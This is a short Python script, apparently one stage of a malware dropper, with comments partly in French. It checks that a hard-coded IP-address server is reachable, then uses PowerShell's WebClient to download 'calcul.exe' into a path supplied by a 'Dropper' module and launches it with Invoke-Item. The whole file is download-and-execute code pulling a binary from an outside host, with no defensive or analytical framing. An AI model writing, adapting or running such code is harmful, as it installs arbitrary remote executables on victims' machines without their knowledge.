import os
import Dropper
import requests

def test_access_to_webpage(url):
    print("[*] Testing access to the webpage: {}".format(url))
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[*] Access to the webpage: {url} : Success")
            return True
    except:
        print(f"[*] Access to the webpage: {url} : Failed")
        return False



def main():
    print(u"Ici va télécharger l'exe")
    url = "http://54.90.113.98:8000/calcul.exe"
    if test_access_to_webpage(url):
        try:
            os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('{url}', '{Dropper.save_path}\\calcul.exe')")
            os.popen(f"powershell.exe -Command Invoke-Item {Dropper.save_path}\\calcul.exe")
            return True
        except:
            print("Error")
            return False
    else:
        return False

